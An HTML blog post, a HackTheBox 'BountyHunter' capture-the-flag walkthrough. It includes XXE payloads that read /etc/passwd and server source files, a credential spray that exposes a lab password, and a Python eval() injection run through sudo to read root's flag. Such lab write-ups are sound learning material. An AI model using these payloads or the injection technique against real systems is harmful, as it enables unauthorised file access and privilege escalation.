@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series.
+I hope you have a nice weekend and without further ado, let us jump right in!
+Enumeration Nmap output ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.">  
+
+  <title>
+    
+      HackTheBox: BountyHunter
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2021-10-03 09:30:00 &#43;1345 &#43;1345">
+            2021-10-03
+        </time>
+    </p>
+
+    <h1>HackTheBox: BountyHunter</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap-output">Nmap output</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#xml-eternal-entity">XML Eternal Entity</a></li>
+        <li><a href="#credentials-spraying-with-cme">Credentials spraying with CME</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#eval--evil">Eval() == Evil</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>Today, we are delving into BountyHunter as another HackTheBox machine in our <em>sidetrack</em> series.</p>
+<p>I hope you have a nice weekend and without further ado, let us jump right in!</p>
+<h2 id="enumeration"><a class="h-anchor" href="#enumeration">Enumeration</a></h2>
+<h3 id="nmap-output"><a class="h-anchor" href="#nmap-output">Nmap output</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter]
+</span></span><span style="display:flex;"><span>└─$ cat nmap/BountyHunter.nmap 
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Nmap 7.91 scan initiated Sat Oct  2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#f00">for</span> 10.10.11.100
+</span></span><span style="display:flex;"><span>Host is up (0.048s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#f60">65533</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#f60">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
+</span></span><span style="display:flex;"><span>|   <span style="color:#f60">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  <span style="color:#f60">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Bounty Hunters
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively.</p>
+<p>The default index shows no conspicuous detail aside from its portal redirecting to a report form.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-34.png"></p>
+<p>Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters.</p>
+<h2 id="exploitation"><a class="h-anchor" href="#exploitation">Exploitation</a></h2>
+<h3 id="xml-eternal-entity"><a class="h-anchor" href="#xml-eternal-entity">XML Eternal Entity</a></h3>
+<p>As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-46.png"></p>
+<p>From here you can tell that the value of <code>data</code> field is encoded, so I prefer using  <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, a powerful yet simple utility, to analyze and decode it.</p>
+<p>Our recipe consists of <strong>URL Decode</strong> and <strong>From Base64</strong>, sequentially.</p>
+<p><img alt="Using Cyberchef to decode" src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-48.png"></p>
+<p>The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input.</p>
+<p>You can read more about XXE <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">here</a>.</p>
+<p>Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the <code>/etc/passwd</code> on the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#e5e5e5">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e5e5e5">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
+</span></span><span style="display:flex;"><span>		&lt;bugreport&gt;
+</span></span><span style="display:flex;"><span>		&lt;title&gt;&amp;xxe;&lt;/title&gt;
+</span></span><span style="display:flex;"><span>		&lt;cwe&gt;x&lt;/cwe&gt;
+</span></span><span style="display:flex;"><span>		&lt;cvss&gt;x&lt;/cvss&gt;
+</span></span><span style="display:flex;"><span>		&lt;reward&gt;aaaa&gt;&lt;/reward&gt;
+</span></span><span style="display:flex;"><span>		&lt;/bugreport&gt;
+</span></span></code></pre></div><p>And the return is:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-50.png"></p>
+<p>In case the <code>expect://</code> module is available on the target server then you can craft your payload as below and actually get RCE.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#e5e5e5">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e5e5e5">&lt;!ENTITY xxe SYSTEM &#34;expect://ls&#34; &gt;</span>]&gt; <span style="color:#0f0">&lt;!-- execute &#34;ls&#34; command --&gt;</span>
+</span></span><span style="display:flex;"><span>		&lt;bugreport&gt;
+</span></span><span style="display:flex;"><span>		&lt;title&gt;&amp;xxe;&lt;/title&gt;
+</span></span><span style="display:flex;"><span>		&lt;cwe&gt;x&lt;/cwe&gt;
+</span></span><span style="display:flex;"><span>		&lt;cvss&gt;x&lt;/cvss&gt;
+</span></span><span style="display:flex;"><span>		&lt;reward&gt;aaaa&gt;&lt;/reward&gt;
+</span></span><span style="display:flex;"><span>		&lt;/bugreport&gt;
+</span></span></code></pre></div><p>Unfortunately, the result is just four empty fields, which indicates that <code>expect://</code> is not loaded or this is a blind injection. Not really matter, though.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-51.png"></p>
+<p>We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already <a href="https://legiahuyy.github.io/blog/en/RFI-Wrapper/">used it</a> in one of my university challenges.</p>
+<p>So our new payload is as following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#e5e5e5">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e5e5e5">&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34; &gt;</span>]&gt;
+</span></span><span style="display:flex;"><span>		&lt;bugreport&gt;
+</span></span><span style="display:flex;"><span>		&lt;title&gt;&amp;xxe;&lt;/title&gt;
+</span></span><span style="display:flex;"><span>		&lt;cwe&gt;x&lt;/cwe&gt;
+</span></span><span style="display:flex;"><span>		&lt;cvss&gt;x&lt;/cvss&gt;
+</span></span><span style="display:flex;"><span>		&lt;reward&gt;aaaa&gt;&lt;/reward&gt;
+</span></span><span style="display:flex;"><span>		&lt;/bugreport&gt;
+</span></span></code></pre></div><p>It reads and encodes <code>index.php</code> on the server to a base64 string.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-58.png"></p>
+<p>Yet it is just some HTML and CSS, nothing special so I have <code>gobuster</code> enumerating <code>.php</code> and other sensitive extensions.</p>
+<p><img alt="db.php" src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-01.png"></p>
+<p>After retrieving <code>db.php</code> and decoding the content, we have some credentials.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-04.png"></p>
+<p>But neither <code>test</code> nor <code>admin</code> was a valid username for SSH login, so I try looking for another user with console on the server system by searching for <code>/bin/bash</code> or <code>/home/(username)</code> in the <code>/etc/passwd</code> file.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-08.png"></p>
+<p>There are just <code>root</code> and <code>Development</code>.</p>
+<h3 id="credentials-spraying-with-cme"><a class="h-anchor" href="#credentials-spraying-with-cme">Credentials spraying with CME</a></h3>
+<p>In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, <code>user.txt</code> and <code>pass.txt</code>).</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-16.png"></p>
+<p>And the valid credentials are: <code>development:m19RoAU0hP41A1sTsq6K</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-18.png"></p>
+<h2 id="privilege-escalation"><a class="h-anchor" href="#privilege-escalation">Privilege Escalation</a></h2>
+<p>To know whether <code>development</code> user is capable of executing command as superuser or not, try <code>$ sudo -l</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>development@bountyhunter:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#f00">for</span> development on
+</span></span><span style="display:flex;"><span>    bountyhunter:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    <span style="color:#eedd82">secure_path</span>=/usr/local/sbin<span style="color:#87ceeb">\:</span>/usr/local/bin<span style="color:#87ceeb">\:</span>/usr/sbin<span style="color:#87ceeb">\:</span>/usr/bin<span style="color:#87ceeb">\:</span>/sbin<span style="color:#87ceeb">\:</span>/bin<span style="color:#87ceeb">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User development may run the following commands on
+</span></span><span style="display:flex;"><span>        bountyhunter:
+</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /usr/bin/python3.8
+</span></span><span style="display:flex;"><span>        /opt/skytrain_inc/ticketValidator.py
+</span></span></code></pre></div><p>As can be seen, <code>development</code> can execute <code>/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code> as root without password.</p>
+<h3 id="eval--evil"><a class="h-anchor" href="#eval--evil">Eval() == Evil</a></h3>
+<p>Reading <code>/opt/skytrain_inc/ticketValidator.py</code> source.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#Skytrain Inc Ticket Validation System 0.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#Do not distribute this file.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">load_file</span>(loc):
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> loc.endswith(<span style="color:#87ceeb">&#34;.md&#34;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> open(loc, <span style="color:#87ceeb">&#39;r&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#87ceeb">&#34;Wrong file type.&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">evaluate</span>(ticketFile):
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">#Evaluates a ticket to check for ireggularities.</span>
+</span></span><span style="display:flex;"><span>    code_line = <span style="color:#f00">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> i,x in enumerate(ticketFile.readlines()):
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> i == <span style="color:#f60">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span> not x.startswith(<span style="color:#87ceeb">&#34;# Skytrain Inc&#34;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> i == <span style="color:#f60">1</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span> not x.startswith(<span style="color:#87ceeb">&#34;## Ticket to &#34;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Destination: </span><span style="color:#87ceeb">{</span><span style="color:#87ceeb">&#39; &#39;</span>.join(x.strip().split(<span style="color:#87ceeb">&#39; &#39;</span>)[<span style="color:#f60">3</span>:])<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> x.startswith(<span style="color:#87ceeb">&#34;__Ticket Code:__&#34;</span>):
+</span></span><span style="display:flex;"><span>            code_line = i+<span style="color:#f60">1</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> code_line and i == code_line:
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span> not x.startswith(<span style="color:#87ceeb">&#34;**&#34;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>            ticketCode = x.replace(<span style="color:#87ceeb">&#34;**&#34;</span>, <span style="color:#87ceeb">&#34;&#34;</span>).split(<span style="color:#87ceeb">&#34;+&#34;</span>)[<span style="color:#f60">0</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span> int(ticketCode) % <span style="color:#f60">7</span> == <span style="color:#f60">4</span>:
+</span></span><span style="display:flex;"><span>                validationNumber = eval(x.replace(<span style="color:#87ceeb">&#34;**&#34;</span>, <span style="color:#87ceeb">&#34;&#34;</span>))
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">if</span> validationNumber &gt; <span style="color:#f60">100</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">return</span> <span style="color:#f00">True</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">main</span>():
+</span></span><span style="display:flex;"><span>    fileName = input(<span style="color:#87ceeb">&#34;Please enter the path to the ticket file.</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>    ticket = load_file(fileName)
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">#DEBUG print(ticket)</span>
+</span></span><span style="display:flex;"><span>    result = evaluate(ticket)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (result):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#87ceeb">&#34;Valid ticket.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#87ceeb">&#34;Invalid ticket.&#34;</span>)
+</span></span><span style="display:flex;"><span>    ticket.close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main()
+</span></span></code></pre></div><p>Code breakdown:</p>
+<p><code>load_file</code> checks whether the file extension is <code>.md</code> or not.</p>
+<p><code>evaluate</code></p>
+<ul>
+<li>returns <code>False</code> whether the first line doesn&rsquo;t start with <code># Skytrain Inc</code> or <code>## Ticket to</code>; otherwise, prints the destination and continues.</li>
+<li>reads the string below &ldquo;__Ticket Code:__&rdquo;, removes (**) and thereafter assigns the number before the (+) operator as<code>ticketCode</code>.</li>
+<li>Executes the following string as code whether the modulo of <code>ticketCode</code> and 7 is 4.</li>
+</ul>
+<p>Hence, our <code>root_ticket.md</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> Skytrain Inc
+</span></span><span style="display:flex;"><span><span style="color:#0f0">## Ticket to New Haven</span>
+</span></span><span style="display:flex;"><span>__Ticket Code:__
+</span></span><span style="display:flex;"><span>**32+100 and __import__(<span style="color:#87ceeb">&#39;os&#39;</span>).system(<span style="color:#87ceeb">&#39;cat /root/root.txt&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#0f0">##Issued: 2021/10/03</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#End Ticket</span>
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_17-13.png"></p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
